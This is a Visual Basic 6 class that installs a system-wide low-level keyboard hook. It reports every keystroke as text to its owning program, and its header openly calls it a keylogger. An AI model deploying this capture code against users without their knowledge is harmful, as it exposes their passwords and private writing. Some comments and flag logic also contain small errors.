VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "cHooKey"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'==================================================================================================
'cKeyLogger runs a system-wide (global) low-level keyboard hook (Windows 2000, XP or better)
'
'Paul_Caton@hotmail.com
'Copyright free, use and abuse as you see fit.
'
'Features:
'  *seems* to do a much better job of interpreting and representing keystrokes than anything
'  else I've managed to find on PSC... as yet.
'
'  Raises locale specific data. If you run with a French keyboard layout set, you'll see the
'  French names for the keys reported. You can even change keyboard layounts on the fly.
'==================================================================================================
Option Explicit

'This class raises events to its owner, thus the owner should declare the instance
'using WithEvents. sKey is the name of the key(s) pressed. bInjected when True means
'that the keystroke events where generated programaticaly using the keybd_event/SendInput api.
Public Event KeyPress(ByVal sKey As String, ByVal bInjected As Boolean)

'Flags
Private Const LLKHF_EXTENDED    As Long = &H1
Private Const LLKHF_INJECTED    As Long = &H10
Private Const LLKHF_ALTDOWN     As Long = &H20
Private Const LLKHF_UP          As Long = &H80
Private Const DONT_CARE_LR      As Long = &H2000000

'Virtual keys that we need
Private Const VK_SHIFT          As Long = &H10
Private Const VK_CONTROL        As Long = &H11
Private Const VK_MENU           As Long = &H12
Private Const VK_PAUSE          As Long = &H13
Private Const VK_CAPITAL        As Long = &H14
Private Const VK_SPACE          As Long = &H20
Private Const VK_INSERT         As Long = &H2D
Private Const VK_NUMLOCK        As Long = &H90
Private Const VK_SCROLL         As Long = &H91
Private Const VK_LSHIFT         As Long = &HA0
Private Const VK_RSHIFT         As Long = &HA1
Private Const VK_LCONTROL       As Long = &HA2
Private Const VK_RCONTROL       As Long = &HA3
Private Const VK_LMENU          As Long = &HA4
Private Const VK_RMENU          As Long = &HA5

Private m_Active                As Boolean                  'Enables/disables KeyLogging
Private m_ShowLR                As Boolean                  'Distinguish between left and right modifiers
Private shift                   As cShift                   'Bit shifting class
Private hkKbd                   As cHook                    'cHook instance

Implements iHook                                            'We have implemented iHook, cHook's interface

'Api declares
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function GetKeyNameText Lib "user32" Alias "GetKeyNameTextA" (ByVal lParam As Long, ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Function MapVirtualKey Lib "user32" Alias "MapVirtualKeyA" (ByVal uCode As Long, ByVal uMapType As Long) As Long
Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Long, ByVal uScanCode As Long, lpbKeyState As Byte, lpwTransKey As Long, ByVal fuState As Long) As Long

'Initialize the cKeyLogger class
Private Sub Class_Initialize()
  Set shift = New cShift                                    'Create the bit shifting class
  Set hkKbd = New cHook                                     'Create the hook class
  
  Call hkKbd.Hook(Me, WH_KEYBOARD_LL, False)                'Create a system-wide low-level keyboard hook
End Sub

'Terminate the cKeyLogger class
Private Sub Class_Terminate()
  Set hkKbd = Nothing
  Set shift = Nothing
End Sub

'The Active property allows the class user to enable/disable key logging without having to create/destroy the class
Public Property Get Active() As Boolean
  Active = m_Active
End Property

Public Property Let Active(ByVal NewValue As Boolean)
  m_Active = NewValue
End Property

'The ShowLR determines wether we indicate modifiers (alt, shift, control) as being right sided.
Public Property Get ShowLR() As Boolean
  ShowLR = m_ShowLR
End Property

Public Property Let ShowLR(ByVal NewValue As Boolean)
  m_ShowLR = NewValue
End Property

'The implemented cHook callback interface
Private Sub iHook_Proc(ByVal bBefore As Boolean, bHandled As Boolean, lReturn As Long, nCode As WinSubHook2.eHookCode, wParam As Long, lParam As Long)
  Dim sKey As String
  Dim kb   As WinSubHook2.tKBDLLHOOKSTRUCT
  
  'If we're active
  If m_Active Then
  
    'We'll settle for processing before the subsequent hook handlers in the chain
    If bBefore Then
    
      'Action...
      If nCode = HC_ACTION Then
      
        'We'll do our work with the key down events
        If wParam = WinSubHook2.eMsg.WM_SYSKEYDOWN Or _
           wParam = WinSubHook2.eMsg.WM_KEYDOWN Then
          
          'Get the low-level keyboard data from the lParam pointer
          kb = hkKbd.xKBDLLHOOKSTRUCT(lParam)
          
          'If the key is not a modifier
          If Not KeyIsMod(kb.vkCode) Then
          
            'Convert the key data to text
            sKey = FmtKey(kb)
            
            'If we've got some text
            If Len(sKey) Then RaiseEvent KeyPress(sKey, kb.flags And LLKHF_INJECTED)
          End If
        End If
      End If
    End If
  End If
End Sub

'Convert the hook key data to a textual representation
Private Function FmtKey(ByRef kb As WinSubHook2.tKBDLLHOOKSTRUCT, Optional bIgnoreMod As Boolean) As String
  Dim kState(0 To 255)  As Byte 'The entire virtual keyboard state in an array
  Dim i                 As Long
  Dim nKey              As Long
  Dim nMsg              As Long

  'Get the name of the key pressed
  FmtKey = GetKeyName(kb)
  
  'Process by the length of the key name
  Select Case Len(FmtKey)
  Case 0 'No name
    FmtKey = "[UNRECOGNISED-" & kb.vkCode & "]"
    
  Case 1 'Name length 1... then it must be a letter, number or character key
    Call GetKeyboardState(kState(0))
    
    'Ensure that kState is correct regarding the *actual* shift/caps status.
    'You'd be right to think that GetKeyBoardState *seems* to have some problems with the shift status... probably me.
    kState(VK_CAPITAL) = GetKeyState(VK_CAPITAL) And 1                  'Ensure the Caps-Lock toggle bit is set correctly
    kState(VK_SHIFT) = IIf(GetKeyState(VK_SHIFT) And &H8000, &H80, 0)   'Ensure the shift key down status is set correctly
    
    'GetKeyName will return "A" whether a shifted or unshifted "A" is pressed.
    'So now that we know we have a character key, get windows to work it out
    i = ToAscii(kb.vkCode, kb.scanCode, kState(0), nKey, kb.flags And LLKHF_ALTDOWN)

    If i > 0 Then
      'We've got a least one character byte
      FmtKey = Chr$(nKey And &HFF)

      If i > 1 Then
        'We've got two character bytes!
        FmtKey = FmtKey & Chr$(shift.ShiftRight(nKey, 8) And &HFF)
      End If
    End If
  
    'The control key gives a false (for our purposes) ascii value of the character... adjust.
    If GetAsyncKeyState(VK_CONTROL) And &H8000 Then If Asc(FmtKey) < 32 Then FmtKey = Chr$(Asc(FmtKey) + 64)
    
    'Prepend any currently pressed modifiers
    If GetAsyncKeyState(VK_LCONTROL) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_LCONTROL)) & "+" & FmtKey
    If GetAsyncKeyState(VK_RCONTROL) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_RCONTROL)) & "+" & FmtKey
    If GetAsyncKeyState(VK_LMENU) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_LMENU)) & "+" & FmtKey
    If GetAsyncKeyState(VK_RMENU) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_RMENU)) & "+" & FmtKey
    
  Case Else
    'The name of the key is longer than a single character
    
    'Append toggle indicators (+ indicates toggled on, - indicates toggled off)
    Select Case kb.vkCode
      Case VK_CAPITAL: FmtKey = FmtKey & Toggle(VK_CAPITAL)
      Case VK_NUMLOCK: FmtKey = FmtKey & Toggle(VK_NUMLOCK)
      Case VK_SCROLL:  FmtKey = FmtKey & Toggle(VK_SCROLL)
      Case VK_INSERT:  FmtKey = FmtKey & Toggle(VK_INSERT)
      Case VK_PAUSE:   FmtKey = FmtKey & Toggle(VK_PAUSE)
    End Select
    
    'Prepend modifier indicators where pressed
    If GetAsyncKeyState(VK_LCONTROL) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_LCONTROL)) & "+" & FmtKey
    If GetAsyncKeyState(VK_RCONTROL) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_RCONTROL)) & "+" & FmtKey
    If GetAsyncKeyState(VK_LSHIFT) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_LSHIFT)) & "+" & FmtKey
    If GetAsyncKeyState(VK_RSHIFT) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_RSHIFT)) & "+" & FmtKey
    If GetAsyncKeyState(VK_LMENU) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_LMENU)) & "+" & FmtKey
    If GetAsyncKeyState(VK_RMENU) And &H8000 Then FmtKey = GetKeyName(GetHookFromKey(VK_RMENU)) & "+" & FmtKey
  End Select
End Function

'Return "+" if the passed virtual key index is toggled on, else return "-" where toggled off. Caps-Lock, Num-Lock etc.
Private Function Toggle(ByVal Index As Long) As String
  If GetKeyState(Index) And 1 Then
    Toggle = "-"
  Else
    Toggle = "+"
  End If
End Function

'Get windows to retrieve the locale specific name of the keystroke from the passed hook data
Private Function GetKeyName(ByRef kb As WinSubHook2.tKBDLLHOOKSTRUCT) As String
  Dim i     As Long
  Dim nMsg  As Long

  If kb.vkCode = VK_SPACE Then
    'GetKeyNameText will return "SPACE"... I want to display Chr$(32)
    GetKeyName = " "
  Else

    'Initialize our string
    GetKeyName = Space$(32)
    
    'Calculate the equivalent to the lParam value you'd receive in a WndProc with a WM_KEY?? event.
    nMsg = GetMsgFromHook(kb)
    
    'Get the localized key name
    i = GetKeyNameText(nMsg, GetKeyName, 32)

    If i > 0 Then
      'i gives the string length, trim away the trailing null and spaces
      GetKeyName = Left$(GetKeyName, i)
    Else
      GetKeyName = vbNullString
    End If
  End If
End Function

'From the passed keystroke hook data, return the equivalent lParam value that you'd receive in a
'WndProc for a WM_KEY?? event. GetKeyNameText will use that value to get the localized name of the key.
Private Function GetMsgFromHook(ByRef kb As WinSubHook2.tKBDLLHOOKSTRUCT) As Long
  GetMsgFromHook = 1
  GetMsgFromHook = GetMsgFromHook + shift.ShiftLeft(kb.scanCode, 16)
  GetMsgFromHook = GetMsgFromHook + shift.ShiftLeft(kb.flags, 24)
  
  'If we don't want to see right modifier disctinction then we can disable it
  'in the GetKeyName function by setting the DONT_CARE_LR bit
  If Not m_ShowLR Then
    GetMsgFromHook = GetMsgFromHook Or DONT_CARE_LR
  End If
End Function

'Build a hook data structure as if the passed virtual key were pressed
Private Function GetHookFromKey(ByVal VK As Long) As WinSubHook2.tKBDLLHOOKSTRUCT
  With GetHookFromKey
    .scanCode = MapVirtualKey(VK, 0)
    .vkCode = VK
    .Time = GetTickCount
    .dwExtraInfo = 0
    
    Select Case VK
    Case &H3, &H11, &H12, &H21 To &H28, &H2C To &H2E, &H6F, VK_RCONTROL
      .flags = .flags Or LLKHF_EXTENDED
    End Select

    If (VK = VK_LMENU) Or (VK = VK_RMENU) Then
      .flags = .flags & LLKHF_ALTDOWN
    End If
  End With
End Function

'Return whether the passed virtual key is a modifier
Private Function KeyIsMod(ByVal VK As Long) As Boolean
  Select Case VK
  Case VK_LMENU, VK_RMENU, VK_MENU, VK_LCONTROL, VK_RCONTROL, VK_CONTROL, VK_LSHIFT, VK_RSHIFT, VK_SHIFT
    KeyIsMod = True
  End Select
End Function
